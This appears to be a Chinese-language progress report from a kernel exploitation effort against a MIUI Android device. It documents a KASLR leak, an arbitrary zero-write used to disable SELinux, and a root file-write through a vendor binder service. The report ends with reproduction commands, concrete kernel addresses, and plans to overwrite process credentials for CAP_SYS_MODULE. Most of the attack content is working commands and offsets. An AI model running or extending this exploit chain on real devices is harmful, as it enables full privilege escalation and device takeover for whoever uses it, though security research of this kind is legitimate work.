# 157 — SELinux 已关闭 · root 任意写 · usermodehelper 全禁用（关键转向）

> 2026-10-18 04:15

## 1. 已拿到（本轮实测）

| 能力 | 状态 | 证据 |
|---|---|---|
| **KASLR slide 泄漏**（无特权） | ✅ | `sched/sched_blocked_reason` 的 `caller` 64 位值 → slide=`0x2BF8200000`（本次启动），见报告 156 |
| **任意地址 8 字节零写** | ✅ | `t64560_v33`（`rb_left=T, rb_right=0, parent=0`，"只有左孩子"分支，不污染 leftmost） |
| **SELinux 关闭** | ✅ | 把 `selinux_state` 首 8 字节清零 ⇒ `enforcing=0`、`initialized=0`；实测 `cat /sys/fs/selinux/enforce` = **0**，且 `/proc/iomem` 对 hypsys 变为可读 |
| **root 干净任意文件写** | ✅ | `miui.mqsas.IMQSNative` **code 7 `path data`**：实测写出 `/data/local/tmp/c7test`（`-rw------- root system`，内容 10 字节、无任何头部/后缀） |

`code 7` 的用法：

```
CLASSPATH=/data/local/tmp/caplog.jar app_process64 /system/bin CapLog \
    miui.mqsas.IMQSNative 7 <path> '<data>'
```

> 顺带纠正一个老坑：`rootcmd.run()` 内部会先 `logcat -c`，会把刚 `log -t` 写进缓冲区的消息清掉；
> 且 `logcat -f` 写文件必定先写一行 `--------- beginning of main`，**不适合写单行 sysctl**。

## 2. 关键否决：这个内核禁用了所有 usermodehelper

```
CONFIG_STATIC_USERMODEHELPER=y
CONFIG_STATIC_USERMODEHELPER_PATH=""
```

实测：

```
coredump: 25747(coredump): Core dump to |/system/bin/sh disabled
coredump: 26129(coredump): Core dump to |/system/bin/toybox disabled
```

- `core_pattern = |/system/bin/sh /data/local/tmp/r.sh` 写入成功、`core_pipe_limit` 也调到 4，
  内核仍然只打印 `disabled`，helper 完全不执行。
- 把 `/proc/sys/kernel/modprobe` 指向 `/data/local/tmp/modhelper`（0755 脚本）后，
  用未知 binfmt（4 字节 `0xff`）触发 `request_module`，helper 依然不执行（`mod_stage.log` 未生成）。

⇒ **`core_pattern` / `modprobe_path` / `/sys/kernel/uevent_helper` / cgroup `release_agent`
这一整类"让内核以 root 执行我们的东西"的通道，在本机全部作废。**

（`/sys/kernel/uevent_helper` 文件本身也不存在。）

## 3. 因此剩下的唯一方向：改自己的 cred

usermodehelper 断了之后，要拿到"能执行 insmod 的 root"，只能让**我们自己的进程**持有
`CAP_SYS_MODULE`。可行的做法已经具备一半：

- 已知 KASLR ⇒ `init_user_ns`、`init_cred`、`init_task`、`selinux_state` 等静态地址全部已知；
- 我们有**指针值写**形态（`child->__rb_parent_color = pc` ⇒ `*(child) = pc`），
  只要写入的 `pc` 是"可写的内核地址"，副作用就可控；
- 页对齐的堆地址低 12 位为 0，但高位能提供 `CAP_SYS_MODULE(16)`、`CAP_SYS_ADMIN(21)`
  等位——也就是说 `cred->cap_effective = <某个我们已知的堆页地址>` 能凭空点亮一批 caps。

**唯一缺的仍然是 `cred` 的地址。**

## 4. 下一步（按优先级）

1. **拿 `cred`/`task_struct` 地址**。仍是 64560 的 `collect_posix_cputimers`
   （`mrs sp_el0; stlr [node+0x48]`），卡点是 `node+0x20 = cpu_timer.head` 必须是真实
   `&sig->cputimer.timers`，否则节点不被摘除 → 第二轮 `list_add` double-add。
   现在多了一个有利条件：**SELinux 已关**，`/proc/<pid>/...`、`/proc/kallsyms` 等对 root 全开，
   可以先用 root 读把 `signal_struct` 的形态/偏移确认清楚（BTF 已有）。
2. 若 collect 仍不通，考虑"页复用拿已知页 → 该页上分配 cred"的老方案，
   再配合指针值写把 `cap_effective` 点亮。
3. **不要**再在 core_pattern/modprobe/uevent_helper 上花时间（已证实整体禁用）。

## 5. 设备当前状态

- `enforce=0`（SELinux 关闭），`uptime` 约 30 分钟，未重启。
- 内核日志有大量 `SELinux: security_sid_to_context_core: called before initial load_policy on
  unknown SID xxxx` —— 这是 `initialized=0` 的副作用（hook 早退），不影响我们的读写。
- `/data/local/tmp` 下工具：`t64560_v33`、`caplog.jar`、`coredump`、`r.sh`、`modhelper`、`trig`。

## 6. 复现（本次启动）

```
# slide
adb shell /data/local/tmp/grab_blocked.sh
adb pull /data/local/tmp/bl_0.bin analysis/out/blocked/ ; python analysis/slide_now.py analysis/out/blocked
# 目标 = selinux_state(0xffffffc082918630) + slide
adb shell "/data/local/tmp/t64560_v33 800 400 16 6000 12000 0xffffffec7ab18630"
# 生效后
adb shell "cat /sys/fs/selinux/enforce"   # → 0
# root 任意写（code 7）
adb shell "CLASSPATH=/data/local/tmp/caplog.jar app_process64 /system/bin CapLog \
           miui.mqsas.IMQSNative 7 /proc/sys/kernel/core_pattern '|/system/bin/sh ...'"
```
